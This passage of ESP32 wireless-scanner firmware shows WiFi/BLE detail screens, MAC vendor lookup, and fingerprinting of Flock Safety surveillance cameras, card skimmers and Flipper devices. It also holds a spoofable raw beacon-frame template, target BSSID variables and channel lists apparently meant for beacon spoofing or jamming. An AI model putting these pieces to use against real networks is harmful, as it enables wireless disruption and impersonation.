    tft.setTextSize(2);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(8, 28);
    // Truncate long SSIDs
    char displaySSID[17];
    strncpy(displaySSID, wifiDetailSnapshotSSID, 16);
    displaySSID[16] = 0;
    tft.print(displaySSID[0] ? displaySSID : "(hidden)");
    tft.drawFastHLine(0, 50, 240, tft.color565(50,50,50));

    // RSSI bar
    int rssi = wifiDetailSnapshotRSSI;
    int barPct = constrain(map(rssi, -100, -30, 0, 100), 0, 100);
    uint16_t barColor = rssi >= -60 ? ILI9341_GREEN : rssi >= -75 ? ILI9341_YELLOW : ILI9341_RED;
    tft.fillRect(8, 58, 224, 12, tft.color565(40,40,40));
    tft.fillRect(8, 58, (int)(224 * barPct / 100), 12, barColor);
    tft.setTextSize(1);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(8, 74);
    tft.print("Signal: "); tft.print(rssi); tft.print(" dBm  (");
    tft.print(barPct); tft.print("%)");

    // Distance estimate
    float dist = -1.0f;
    if (rssi > -100) {
        // Free-space path loss model: d = 10^((TxPower - RSSI) / (10*n))
        // TxPower ~-30 dBm at 1m, n=2.7 for indoor
        dist = powf(10.0f, (-30.0f - (float)rssi) / (10.0f * 2.7f));
    }
    tft.setCursor(8, 88);
    tft.setTextColor(tft.color565(160,160,160));
    tft.print("Distance: ~");
    if (dist < 0) tft.print("?");
    else if (dist < 1.0f) { tft.print((int)(dist * 100)); tft.print(" cm"); }
    else { tft.print((int)dist); tft.print(" m"); }

    tft.drawFastHLine(0, 100, 240, tft.color565(40,40,40));

    // Details
    int y = 108;
    auto row = [&](const char* label, const char* value, uint16_t valColor) {
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(120,120,120));
        tft.setCursor(8, y);
        tft.print(label);
        tft.setTextColor(valColor);
        tft.setCursor(90, y);
        tft.print(value);
        y += 18;
    };

    row("BSSID:", wifiDetailSnapshotBSSID, ILI9341_YELLOW);

    char chStr[8]; snprintf(chStr, sizeof(chStr), "%d", wifiDetailSnapshotChannel);
    row("Channel:", chStr, ILI9341_WHITE);

    row("Security:", wifiDetailSnapshotEnc[0] ? wifiDetailSnapshotEnc : "?",
        strcmp(wifiDetailSnapshotEnc, "OPEN") == 0 ? ILI9341_RED : ILI9341_GREEN);

    if (wifiDetailSnapshotHint[0]) {
        row("Type:", wifiDetailSnapshotHint, tft.color565(100, 200, 255));
    }

    // Full SSID if truncated
    if (strlen(wifiDetailSnapshotSSID) > 16) {
        tft.setTextColor(tft.color565(120,120,120));
        tft.setCursor(8, y); tft.print("SSID:"); y += 12;
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(8, y); tft.print(wifiDetailSnapshotSSID); y += 18;
    }

    tft.setTextColor(tft.color565(80,80,80));
    tft.setCursor(8, 290);
    tft.print("LEFT to go back");
}

void updateWiFiDetailLive() {
    if (!wifiDetailSnapshotValid) return;
    int rssi = wifiDetailSnapshotRSSI;
    int barPct = constrain(map(rssi, -100, -30, 0, 100), 0, 100);
    uint16_t barColor = rssi >= -60 ? ILI9341_GREEN : rssi >= -75 ? ILI9341_YELLOW : ILI9341_RED;
    tft.fillRect(8, 58, 224, 12, tft.color565(40,40,40));
    tft.fillRect(8, 58, (int)(224 * barPct / 100), 12, barColor);
    tft.fillRect(8, 74, 232, 20, ILI9341_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(8, 74);
    tft.print("Signal: "); tft.print(rssi); tft.print(" dBm  ("); tft.print(barPct); tft.print("%)");
    float dist = rssi > -100 ? powf(10.0f, (-30.0f - (float)rssi) / (10.0f * 2.7f)) : -1.0f;
    tft.fillRect(8, 88, 232, 12, ILI9341_BLACK);
    tft.setTextColor(tft.color565(160,160,160));
    tft.setCursor(8, 88);
    tft.print("Distance: ~");
    if (dist < 0) tft.print("?");
    else if (dist < 1.0f) { tft.print((int)(dist * 100)); tft.print(" cm"); }
    else { tft.print((int)dist); tft.print(" m"); }
}

// ===== BLE DETAIL SCREEN =====
void drawBLEDetail() {
    static bool detailDrawn = false;
    static char lastMAC[18] = "";
    static String vendorInfo = "";
    static bool lookupDone = false;

    // Full redraw when device changes
    bool newDevice = (strcmp(lastMAC, bleFocusedMAC) != 0);
    if (newDevice) {
        strncpy(lastMAC, bleFocusedMAC, 17); lastMAC[17] = 0;
        detailDrawn = false;
        lookupDone = false;
        vendorInfo = "";
    }

    if (!detailDrawn) {
        tft.fillScreen(ILI9341_BLACK);
        drawStatusBar();

        // Title
        tft.setTextSize(2);
        tft.setTextColor(tft.color565(100, 180, 255));
        tft.setCursor(8, 28);
        tft.print("BLE Device");

        tft.drawFastHLine(0, 50, 240, tft.color565(40, 40, 50));

        int y = 56;
        tft.setTextSize(1);

        // Name
        tft.setTextColor(tft.color565(100,100,110)); tft.setCursor(8, y); tft.print("Name:");
        tft.setTextColor(ILI9341_WHITE); tft.setCursor(8, y+10);
        char nameDisp[32]; strncpy(nameDisp, bleFocusedName, 31); nameDisp[31] = 0;
        tft.print(strlen(nameDisp) > 0 ? nameDisp : "(unnamed)");
        y += 26;

        // MAC
        tft.setTextColor(tft.color565(100,100,110)); tft.setCursor(8, y); tft.print("MAC:");
        tft.setTextColor(tft.color565(180,180,255)); tft.setCursor(8, y+10);
        tft.print(bleFocusedMAC);
        y += 26;

        // RSSI + distance
        tft.setTextColor(tft.color565(100,100,110)); tft.setCursor(8, y); tft.print("Signal:");
        tft.setTextColor(ILI9341_WHITE); tft.setCursor(8, y+10);
        tft.print(bleFocusedRSSI); tft.print(" dBm");
        float dist = powf(10.0f, (-59.0f - (float)bleFocusedRSSI) / (10.0f * 2.0f));
        tft.setTextColor(tft.color565(140,140,140));
        tft.print("  ~"); tft.print(dist, 1); tft.print("m");
        y += 26;

        // Company ID
        int idx = bleDetailIndex;
        if (idx >= 0 && idx < bleDeviceCount) {
            uint16_t cid = bleCompanyIds[idx];
            if (cid != 0) {
                tft.setTextColor(tft.color565(100,100,110)); tft.setCursor(8, y); tft.print("Company ID:");
                tft.setTextColor(tft.color565(200,200,100)); tft.setCursor(8, y+10);
                String cname = getBLECompanyName(cid);
                tft.print(cname.length() > 0 ? cname : "0x" + String(cid, HEX));
                y += 26;
            }
            // Type hint
            if (strlen(bleHints[idx]) > 0) {
                tft.setTextColor(tft.color565(100,100,110)); tft.setCursor(8, y); tft.print("Type:");
                tft.setTextColor(tft.color565(100,255,150)); tft.setCursor(8, y+10);
                tft.print(bleHints[idx]);
                y += 26;
            }
        }

        // OUI vendor placeholder
        tft.setTextColor(tft.color565(100,100,110)); tft.setCursor(8, y); tft.print("OUI Vendor:");
        tft.setTextColor(tft.color565(160,160,160)); tft.setCursor(8, y+10);
        tft.print("Looking up...");

        tft.setTextColor(tft.color565(60,60,70)); tft.setCursor(8, 302);
        tft.print("LEFT back");

        detailDrawn = true;
    }

    // OUI internet lookup — do once per device, requires WiFi
    if (!lookupDone && strlen(bleFocusedMAC) >= 8) {
        lookupDone = true; // mark before attempt to avoid retry loop

        // Extract OUI (first 8 chars: XX:XX:XX)
        char oui[9]; strncpy(oui, bleFocusedMAC, 8); oui[8] = 0;
        // Replace colons for URL: XX:XX:XX → XXXXXX
        char ouiClean[7];
        ouiClean[0] = oui[0]; ouiClean[1] = oui[1];
        ouiClean[2] = oui[3]; ouiClean[3] = oui[4];
        ouiClean[4] = oui[6]; ouiClean[5] = oui[7];
        ouiClean[6] = 0;

        // Try WiFi HTTP lookup via plain TCP (no TLS — saves RAM)
        // Uses api.maclookup.app plain HTTP endpoint
        if (WiFi.status() == WL_CONNECTED) {
            WiFiClient client;
            client.setTimeout(3);
            if (client.connect("api.maclookup.app", 80)) {
                client.print("GET /api/v2/macs/" + String(ouiClean) + "/company/name HTTP/1.0\r\n");
                client.print("Host: api.maclookup.app\r\n");
                client.print("Connection: close\r\n\r\n");
                unsigned long t = millis();
                while (client.connected() && millis() - t < 3000) {
                    if (client.available()) break;
                    delay(10);
                }
                // Skip HTTP headers
                while (client.available()) {
                    String line = client.readStringUntil('\n');
                    if (line == "\r") break;
                }
                if (client.available()) {
                    vendorInfo = client.readStringUntil('\n');
                    vendorInfo.trim();
                    if (vendorInfo.length() > 28) vendorInfo = vendorInfo.substring(0, 28);
                }
                client.stop();
            }
            if (vendorInfo.length() == 0) vendorInfo = "OUI: " + String(oui);
        } else {
            vendorInfo = "OUI: " + String(oui);
        }

        // Update the vendor line on screen
        // Find y position for OUI line (redraw just that area)
        int idx = bleDetailIndex;
        int y = 56 + 26 + 26 + 26; // name + mac + rssi
        if (idx >= 0 && idx < bleDeviceCount) {
            if (bleCompanyIds[idx] != 0) y += 26;
            if (strlen(bleHints[idx]) > 0) y += 26;
        }
        tft.fillRect(8, y+10, 224, 10, ILI9341_BLACK);
        tft.setTextSize(1);
        tft.setTextColor(tft.color565(100, 200, 255));
        tft.setCursor(8, y+10);
        tft.print(vendorInfo);
    }
}

uint8_t targetBSSID[6] = {0};
String targetSSID = "";


// ===== 2.4GHz ACTIVE MODE CHANNELS =====
byte bluetooth_even_channels[] = {2,4,6,8,10,12,14,16,18,20,22,24,26,28,30,32,34,36,38,40};
byte bluetooth_odd_channels[]  = {1,3,5,7,9,11,13,15,17,19,21,23,25,27,29,31,33,35,37,39};
byte wifi_channels[] = {6,7,8,9,10,11,12,13,14,15,16,17,18,22,24,26,28,30,31,32,33,34,35,36,37,38,39,40};

const int num_bluetooth_even = sizeof(bluetooth_even_channels) / sizeof(byte);
const int num_bluetooth_odd  = sizeof(bluetooth_odd_channels) / sizeof(byte);
const int num_wifi           = sizeof(wifi_channels) / sizeof(byte);

uint8_t beaconPacket[128] = {
  0x80, 0x00,                         // Frame Control
  0x00, 0x00,                         // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast)
  0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // Source (will change)
  0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // BSSID (will change)
  0x00, 0x00,                         // Seq

  // Fixed params
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // Timestamp
  0x64, 0x00,                         // Interval
  0x01, 0x04,                         // Capabilities (WPA2 capable)

  // SSID tag
  0x00, 0x20,                         // Tag + length (max 32)

  // SSID placeholder (32 bytes)
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,

  // Supported rates
  0x01, 0x08,
  0x82, 0x84, 0x8b, 0x96,
  0x24, 0x30, 0x48, 0x6c,

  // DS Parameter set (channel)
  0x03, 0x01, 0x01
};

void drawAnimatedScanStatus(const char* label, bool &firstDraw, unsigned long &lastAnim, uint8_t &dots) {
    const int dotAreaW = 34;
    const uint16_t bg = ILI9341_BLACK;
    const uint16_t textSoft = tft.color565(160, 160, 160);

    tft.setTextSize(2);
    tft.setTextColor(ILI9341_WHITE);

    int16_t x1, y1;
    uint16_t w, h;
    tft.getTextBounds(label, 0, 0, &x1, &y1, &w, &h);

    int textX = (240 - (int)w - dotAreaW) / 2;
    int textY = 118;
    int dotsX = textX + w + 6;

    if (firstDraw) {
        tft.fillRect(0, 20, 240, 300, bg);
        tft.setTextSize(2);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(textX, textY);
        tft.print(label);

        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(78, textY + 24);
        tft.print("Please wait");

        dots = 1;
        lastAnim = 0;
        firstDraw = false;
    }

    if (lastAnim == 0 || millis() - lastAnim > 400) {
        lastAnim = millis();

        tft.fillRect(dotsX, textY, dotAreaW, 16, bg);
        tft.setTextSize(2);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(dotsX, textY);

        for (int i = 0; i < dots; i++) {
            tft.print(".");
        }

        dots++;
        if (dots > 3) dots = 1;
    }
}

void drawCountBadge(int x, int y, int count) {
    String value = String(count);
    int16_t x1, y1;
    uint16_t w, h;
    tft.setTextSize(1);
    tft.getTextBounds(value, 0, 0, &x1, &y1, &w, &h);

    const int badgePadX = 8;
    const int badgeW = max(34, (int)w + badgePadX * 2);
    const int badgeH = 18;
    const int radius = 7;

    tft.fillRoundRect(x, y, badgeW, badgeH, radius, tft.color565(230, 230, 230));
    tft.setTextSize(1);
    tft.setTextColor(ILI9341_BLACK);

    int textX = x + ((badgeW - (int)w) / 2);
    int textY = y + 5;
    if (textX < x + 6) textX = x + 6;

    tft.setCursor(textX, textY);
    tft.print(value);
}

static const uint16_t kMetaIdentifiers[] = {0xFD5F, 0xFEB7, 0xFEB8, 0x01AB, 0x058E, 0x0D53};
static const uint16_t kBlockedMetaIdentifiers[] = {0xFD5A, 0xFD69, 0x004C, 0x0006, 0xFEF3};
static const uint8_t kFlockOuiPrefixes[][3] = {
    // Xuntong / Flock Safety primary OUIs
    {0x70, 0xC9, 0x4E}, {0x3C, 0x91, 0x80}, {0xD8, 0xF3, 0xBC}, {0x80, 0x30, 0x49}, {0xB8, 0x35, 0x32},
    {0x14, 0x5A, 0xFC}, {0x74, 0x4C, 0xA1}, {0x08, 0x3A, 0x88}, {0x9C, 0x2F, 0x9D}, {0xC0, 0x35, 0x32},
    {0x94, 0x08, 0x53}, {0xE4, 0xAA, 0xEA}, {0xF4, 0x6A, 0xDD}, {0xF8, 0xA2, 0xD6}, {0x24, 0xB2, 0xB9},
    {0x00, 0xF4, 0x8D}, {0xD0, 0x39, 0x57}, {0xE8, 0xD0, 0xFC}, {0xE0, 0x4F, 0x43}, {0xB8, 0x1E, 0xA4},
    {0x70, 0x08, 0x94}, {0x58, 0x8E, 0x81}, {0xEC, 0x1B, 0xBD}, {0x3C, 0x71, 0xBF}, {0x58, 0x00, 0xE3},
    {0x90, 0x35, 0xEA}, {0x5C, 0x93, 0xA2}, {0x64, 0x6E, 0x69}, {0x48, 0x27, 0xEA}, {0xA4, 0xCF, 0x12},
    {0x82, 0x6B, 0xF2},
    // Additional Flock Safety / Raven camera OUIs (field-observed)
    {0xCC, 0x50, 0xE3}, {0xA0, 0x20, 0xA6}, {0x68, 0x27, 0x37}, {0xB4, 0xE6, 0x2D},
    {0x00, 0x1E, 0x06}, {0x18, 0xFE, 0x34}, {0x24, 0x6F, 0x28}, {0x30, 0xAE, 0xA4},
    {0x40, 0xF5, 0x20}, {0x5C, 0xCF, 0x7F}, {0x60, 0x01, 0x94}, {0x84, 0xF3, 0xEB},
    {0xA4, 0x7B, 0x9D}, {0xBC, 0xDD, 0xC2}, {0xCC, 0x50, 0xE3}, {0xD8, 0xBC, 0x38},
};
// Hop all 11 channels — Flock mesh backhaul uses non-standard channels too
static const uint8_t kFlockHopChannels[] = {1, 6, 11, 3, 8, 2, 9, 4, 7, 5, 10};

#define FLOCK_WIFI_ALERT_QUEUE_SIZE 24
struct FlockWiFiAlert {
    char name[32];
    char mac[18];
    int8_t rssi;
    uint8_t channel;
    char hint[24];
};

static FlockWiFiAlert* flockWiFiAlerts = nullptr;
static volatile uint8_t flockWiFiAlertHead = 0;
static volatile uint8_t flockWiFiAlertTail = 0;
static portMUX_TYPE flockWiFiAlertMux = portMUX_INITIALIZER_UNLOCKED;

bool bleStringContains(const String& haystackLower, const char* needle) {
    return haystackLower.indexOf(needle) >= 0;
}

bool macStartsWith(const String& macLower, const char* ouiLower) {
    return macLower.startsWith(ouiLower);
}

bool flockMacIsMulticast(const uint8_t* mac) {
    return mac != nullptr && ((mac[0] & 0x01) != 0);
}

bool flockOuiMatches(const uint8_t* mac) {
    if (mac == nullptr) {
        return false;
    }
    if ((mac[0] & 0x02) != 0) {
        return false;
    }

    for (size_t i = 0; i < (sizeof(kFlockOuiPrefixes) / sizeof(kFlockOuiPrefixes[0])); i++) {
        if (mac[0] == kFlockOuiPrefixes[i][0] &&
            mac[1] == kFlockOuiPrefixes[i][1] &&
            mac[2] == kFlockOuiPrefixes[i][2]) {
            return true;
        }
    }

    return false;
}

bool flockSsidLooksFlock(const String& ssidLower) {
    return bleStringContains(ssidLower, "flock") ||
           bleStringContains(ssidLower, "penguin") ||
           bleStringContains(ssidLower, "pigvision") ||
           bleStringContains(ssidLower, "raven") ||
           bleStringContains(ssidLower, "safety") ||
           bleStringContains(ssidLower, "ext battery") ||
           bleStringContains(ssidLower, "fs ext") ||
           ssidLower.startsWith("fs_") ||
           ssidLower.startsWith("fs-") ||
           ssidLower.startsWith("flock_") ||
           ssidLower.startsWith("flock-") ||
           ssidLower.startsWith("raven_") ||
           ssidLower.startsWith("raven-");
}

bool flockSsidLooksAdminConfig(const String& ssidLower) {
    return bleStringContains(ssidLower, "admin") ||
           bleStringContains(ssidLower, "setup") ||
           bleStringContains(ssidLower, "config") ||
           bleStringContains(ssidLower, "provision") ||
           bleStringContains(ssidLower, "installer") ||
           bleStringContains(ssidLower, "troubleshoot") ||
           bleStringContains(ssidLower, "maint") ||
           bleStringContains(ssidLower, "field") ||
           bleStringContains(ssidLower, "service");
}

int flockWiFiScore(bool isMgmt, uint8_t frameType, bool wildcardProbe,
                   bool addr1Match, bool addr2Match, bool addr3Match,
                   bool ssidTextMatch, bool adminConfigMatch, int8_t rssi) {
    int score = 0;
    if (addr2Match) score += 4;
    if (addr1Match) score += 2;
    if (addr3Match) score += 3;
    if (ssidTextMatch) score += 5;
    if (adminConfigMatch) score += 3;
    if (wildcardProbe) score += 4;
    if (isMgmt && frameType == 0x40) score += 2;
    if (isMgmt && frameType == 0x80) score += 2;
    if (rssi >= -72) score += 1;
    if (rssi >= -60) score += 1;
    return score;
}

bool bleMacLooksFlock(const String& macLower) {
    if (macLower.length() < 8) {
        return false;
    }

    uint8_t macBytes[3] = {0};
    macBytes[0] = (uint8_t)strtoul(macLower.substring(0, 2).c_str(), nullptr, 16);
    macBytes[1] = (uint8_t)strtoul(macLower.substring(3, 5).c_str(), nullptr, 16);
    macBytes[2] = (uint8_t)strtoul(macLower.substring(6, 8).c_str(), nullptr, 16);
    return flockOuiMatches(macBytes);
}

String classifyWiFiInfrastructure(const String& ssid, const String& bssid) {
    String ssidLower = ssid;
    ssidLower.toLowerCase();
    String macLower = bssid;
    macLower.toLowerCase();

    if (ssidLower.indexOf("traffic") >= 0 || ssidLower.indexOf("intersection") >= 0 ||
        ssidLower.indexOf("signal") >= 0 || ssidLower.indexOf("streetlight") >= 0 ||
        ssidLower.indexOf("street light") >= 0 || ssidLower.indexOf("dot-") >= 0 ||
        ssidLower.startsWith("dot_")) {
        return "Traffic Infra";
    }

    if (ssidLower.indexOf("parking") >= 0 || ssidLower.indexOf("meter") >= 0 ||
        ssidLower.indexOf("utility") >= 0 || ssidLower.indexOf("municipal") >= 0 ||
        ssidLower.indexOf("smartcity") >= 0 || ssidLower.indexOf("smart-city") >= 0) {
        return "City/Utility";
    }

    if (ssidLower.indexOf("transit") >= 0 || ssidLower.indexOf("bus") >= 0 ||
        ssidLower.indexOf("rail") >= 0 || ssidLower.indexOf("train") >= 0) {
        return "Transit Infra";
    }

    if (ssidLower.indexOf("camera") >= 0 || ssidLower.indexOf("cctv") >= 0 ||
        ssidLower.indexOf("ipcam") >= 0 || ssidLower.indexOf("alpr") >= 0 ||
        ssidLower.indexOf("flock") >= 0 || ssidLower.indexOf("axis") >= 0 ||
        ssidLower.indexOf("hikvision") >= 0 || ssidLower.indexOf("dahua") >= 0 ||
        ssidLower.indexOf("arlo") >= 0 || ssidLower.indexOf("ring") >= 0) {
        return "Camera/ALPR";
    }

    if (ssidLower.indexOf("sensor") >= 0 || ssidLower.indexOf("gateway") >= 0 ||
        ssidLower.indexOf("iot") >= 0 || ssidLower.indexOf("node") >= 0 ||
        ssidLower.indexOf("weather") >= 0 || ssidLower.indexOf("env") >= 0) {
        return "IoT Gateway";
    }

    if (ssidLower.indexOf("ubnt") >= 0 || ssidLower.indexOf("unifi") >= 0 ||
        ssidLower.indexOf("meraki") >= 0 || ssidLower.indexOf("aruba") >= 0 ||
        ssidLower.indexOf("cisco") >= 0 || ssidLower.indexOf("ruckus") >= 0 ||
        ssidLower.indexOf("mikrotik") >= 0) {
        return "Enterprise AP";
    }

    if (macStartsWith(macLower, "00:18:0a") || macStartsWith(macLower, "0c:8d:db") ||
        macStartsWith(macLower, "24:a4:3c") || macStartsWith(macLower, "34:56:fe") ||
        macStartsWith(macLower, "58:cb:52") || macStartsWith(macLower, "88:15:44") ||
        macStartsWith(macLower, "e0:55:3d") || macStartsWith(macLower, "f0:9f:c2")) {
        return "Meraki AP";
    }

    if (macStartsWith(macLower, "18:e8:29") || macStartsWith(macLower, "24:5a:4c") ||
        macStartsWith(macLower, "44:d9:e7") || macStartsWith(macLower, "68:d7:9a") ||
        macStartsWith(macLower, "70:a7:41") || macStartsWith(macLower, "74:ac:b9") ||
        macStartsWith(macLower, "78:8a:20") || macStartsWith(macLower, "b4:fb:e4")) {
        return "Ubiquiti AP";
    }

    if (macStartsWith(macLower, "00:1a:1e") || macStartsWith(macLower, "20:4c:03") ||
        macStartsWith(macLower, "24:de:c6") || macStartsWith(macLower, "6c:f3:7f") ||
        macStartsWith(macLower, "94:b4:0f") || macStartsWith(macLower, "d8:c7:c8")) {
        return "Aruba AP";
    }

    if (macStartsWith(macLower, "00:1b:d4") || macStartsWith(macLower, "00:23:04") ||
        macStartsWith(macLower, "2c:3f:38") || macStartsWith(macLower, "34:db:fd") ||
        macStartsWith(macLower, "58:97:bd") || macStartsWith(macLower, "74:a2:e6") ||
        macStartsWith(macLower, "a0:ec:f9") || macStartsWith(macLower, "bc:16:65")) {
        return "Cisco AP";
    }

    if (macStartsWith(macLower, "00:40:8c") || macStartsWith(macLower, "ac:cc:8e") ||
        macStartsWith(macLower, "b8:a4:4f")) {
        return "Axis Camera";
    }

    if (macStartsWith(macLower, "3c:e3:6b") || macStartsWith(macLower, "44:19:b6") ||
        macStartsWith(macLower, "64:db:8b") || macStartsWith(macLower, "90:02:a9")) {
        return "Camera/NVR";
    }

    return "";
}

bool bleMatchesInfrastructureText(const String& lowerText) {
    static const char* const kInfraKeywords[] = {
        "traffic", "intersection", "signal", "parking", "meter",
        "utility", "street", "light", "pole", "city", "municipal",
        "transit", "bus", "rail", "camera", "cctv", "alpr",
        "gateway", "sensor", "beacon", "asset", "fleet", "detector",
        "radar", "loop", "controller", "node", "weather", "environment"
    };

    for (const char* keyword : kInfraKeywords) {
        if (lowerText.indexOf(keyword) >= 0) {
            return true;
        }
    }

    return false;
}

bool bleServiceLooksInfrastructure(uint16_t identifier, String& hintOut) {
    switch (identifier) {
        case 0x181A:
            hintOut = "Env Sensor";
            return true;
        case 0x1821:
            hintOut = "Indoor Pos";
            return true;
        case 0xFEAA:
            hintOut = "Eddystone";
            return true;
        case 0xFE2C:
        case 0xFEF3:
            hintOut = "Beacon/IoT";
            return true;
        default:
            return false;
    }
}

bool bleServiceLooksFlock(uint16_t identifier, String& hintOut) {
    switch (identifier) {
        case 0x1809:
        case 0x1819:
            hintOut = "Raven Legacy";
            return true;
        case 0x180A:
            hintOut = "Raven Info";
            return true;
        case 0x3100:
            hintOut = "Raven GPS";
            return true;
        case 0x3200:
            hintOut = "Raven Power";
            return true;
        case 0x3300:
            hintOut = "Raven Net";
            return true;
        case 0x3400:
            hintOut = "Raven Stats";
            return true;
        case 0x3500:
            hintOut = "Raven Fault";
            return true;
        default:
            return false;
    }
}

bool bleNameIsNumeric(const String& value, int expectedLen = -1) {
    if (value.length() == 0) return false;
    if (expectedLen > 0 && value.length() != expectedLen) return false;

    for (size_t i = 0; i < value.length(); i++) {
        char c = value.charAt(i);
        if (c < '0' || c > '9') {
            return false;
        }
    }

    return true;
}

bool bleHasSerialToken(const String& value) {
    if (value.length() < 3) {
        return false;
    }

    for (int i = 0; i <= (int)value.length() - 3; i++) {
        char a = value.charAt(i);
        char b = value.charAt(i + 1);
        char c = value.charAt(i + 2);

        if ((a == 'T' || a == 't') &&
            (b == 'N' || b == 'n') &&
            c >= '0' && c <= '9') {
            return true;
        }
    }

    return false;
}

int bleHintPriority(const String& hint) {
    if (hint.length() == 0) {
        return 0;
    }

    String lower = hint;
    lower.toLowerCase();

    int score = 10 + ((hint.length() > 12) ? 12 : (int)hint.length());

    if (lower == "infra ble") {
        score = 4;
    } else if (lower == "meta device") {
        score = 5;
    } else if (lower == "flock ble") {
        score = 7;
    } else if (lower == "flock battery") {
        score = 8;
    }

    if (lower.indexOf("flock") >= 0) score += 4;
    if (lower.indexOf("battery") >= 0) score += 6;
    if (lower.indexOf("raven") >= 0) score += 10;
    if (lower.indexOf("wifi") >= 0) score += 18;
    if (lower.indexOf("wildcard") >= 0) score += 8;
    if (lower.indexOf("probe") >= 0 ||
        lower.indexOf("beacon") >= 0 ||
        lower.indexOf("receiver") >= 0 ||
        lower.indexOf("bssid") >= 0) {
        score += 6;
    }
    if (bleHasSerialToken(hint)) score += 20;

    return score;
}

void bleSetPreferredHint(String& currentHint, const String& candidateHint) {
    if (candidateHint.length() == 0) {
        return;
    }

    if (currentHint.length() == 0 ||
        bleHintPriority(candidateHint) > bleHintPriority(currentHint)) {
        currentHint = candidateHint;
    }
}

String bleExtractFlockSerial(const NimBLEAdvertisedDevice* device) {
    if (!device || !device->haveManufacturerData()) {
        return "";
    }

    const std::string mfgData = device->getManufacturerData();
    if (mfgData.length() < 3) {
        return "";
    }

    const uint16_t companyId = (uint8_t)mfgData[0] | ((uint16_t)(uint8_t)mfgData[1] << 8);
    if (companyId != 0x09C8) {
        return "";
    }

    String serial = "";
    bool started = false;

    for (size_t i = 2; i < mfgData.length(); i++) {
        char c = (char)(uint8_t)mfgData[i];

        if (!started) {
            if ((c == 'T' || c == 't') &&
                (i + 1) < mfgData.length() &&
                (((char)(uint8_t)mfgData[i + 1]) == 'N' || ((char)(uint8_t)mfgData[i + 1]) == 'n')) {
                serial = "TN";
                started = true;
                i++;
            }
        } else if (c >= '0' && c <= '9') {
            serial += c;
        } else if (c == ' ' || c == '#' || c == '-') {
            continue;
        } else {
            break;
        }
    }

    return (serial.length() > 2) ? serial : "";
}

String bleComposeFlockHint(const String& baseHint, const String& serial) {
    if (serial.length() == 0) {
        return baseHint;
    }
    if (baseHint.length() == 0 || bleHasSerialToken(baseHint)) {
        return (baseHint.length() == 0) ? serial : baseHint;
    }

    String lower = baseHint;
    lower.toLowerCase();

    if (baseHint.length() > 10) {
        if (lower.indexOf("raven") >= 0) {
            return String("Raven ") + serial;
        }
        if (lower.indexOf("flock") >= 0) {
            return String("Flock ") + serial;
        }
    }

    String composed = baseHint;
    composed += " ";
    composed += serial;
    return composed;
}

uint16_t bleExtractUuid16(const NimBLEUUID& uuid) {
    String uuidText = uuid.toString().c_str();
    uuidText.toUpperCase();

    if (uuidText.length() == 4) {
        return (uint16_t)strtoul(uuidText.c_str(), nullptr, 16);
    }

    if (uuidText.length() >= 8 && uuidText.startsWith("0000")) {
        return (uint16_t)strtoul(uuidText.substring(4, 8).c_str(), nullptr, 16);
    }

    return 0;
}

bool bleHasPayloadPattern(const NimBLEAdvertisedDevice* device, const uint8_t* pattern, size_t patternLen) {
    if (!device || patternLen == 0) {
        return false;
    }

    const std::vector<uint8_t>& payload = device->getPayload();
    if (payload.size() < patternLen) {
        return false;
    }

    for (size_t i = 0; i + patternLen <= payload.size(); i++) {
        bool matched = true;
        for (size_t j = 0; j < patternLen; j++) {
            if (payload[i + j] != pattern[j]) {
                matched = false;
                break;
            }
        }
        if (matched) {
            return true;
        }
    }

    return false;
}

bool bleIsMetaIdentifier(uint16_t identifier) {
    for (uint16_t candidate : kMetaIdentifiers) {
        if (candidate == identifier) {
            return true;
        }
    }
    return false;
}

bool bleIsBlockedMetaIdentifier(uint16_t identifier) {
    for (uint16_t candidate : kBlockedMetaIdentifiers) {
        if (candidate == identifier) {
            return true;
        }
    }
    return false;
}

bool bleMatchesSkimmerName(const String& nameLower) {
    static const char* const kSkimmerKeywords[] = {
        "hc-03", "hc-05", "hc-06", "linvor", "bt05",
        "bt06", "skimmer", "verifone", "ingenico", "bbpos",
        "magtek", "idtech", "wisepad", "wisepos", "mpos"
    };

    for (const char* keyword : kSkimmerKeywords) {
        if (nameLower.indexOf(keyword) >= 0) {
            return true;
        }
    }

    return false;
}

uint16_t bleBuildDetectFlags(const NimBLEAdvertisedDevice* device, const String& name, String& hintOut, uint16_t& primaryIdOut) {
    if (!device) {
        return BLE_FLAG_NONE;
    }

    const std::vector<uint8_t>& payload = device->getPayload();
    String nameLower = name;
    nameLower.toLowerCase();

    uint16_t flags = BLE_FLAG_NONE;
    primaryIdOut = 0;
    hintOut = "";

    // Flipper Zero detection: scan AD structures properly (check AD type byte)
    // Flipper uses service data with UUID 0x3081 (Black), 0x3082 (White), 0x3083 (Clear)
    for (size_t i = 0; i + 2 < payload.size(); ) {
        uint8_t adLen  = payload[i];
        if (adLen == 0 || i + adLen >= payload.size()) break;
        uint8_t adType = payload[i + 1];
        // AD type 0x16 = Service Data - 16-bit UUID
        if (adType == 0x16 && adLen >= 3) {
            uint16_t uuid = (uint16_t)payload[i + 2] | ((uint16_t)payload[i + 3] << 8);
            if (uuid == 0x3081) { flags |= BLE_FLAG_FLIPPER; hintOut = "Flipper Black"; }
            else if (uuid == 0x3082) { flags |= BLE_FLAG_FLIPPER; hintOut = "Flipper White"; }
            else if (uuid == 0x3083) { flags |= BLE_FLAG_FLIPPER; hintOut = "Flipper Clear"; }
        }
        i += adLen + 1;
    }

    if (bleMatchesSkimmerName(nameLower)) {
        flags |= BLE_FLAG_SKIMMER;
        if (hintOut.length() == 0) {
            hintOut = "Skimmer Candidate";
        }
    }

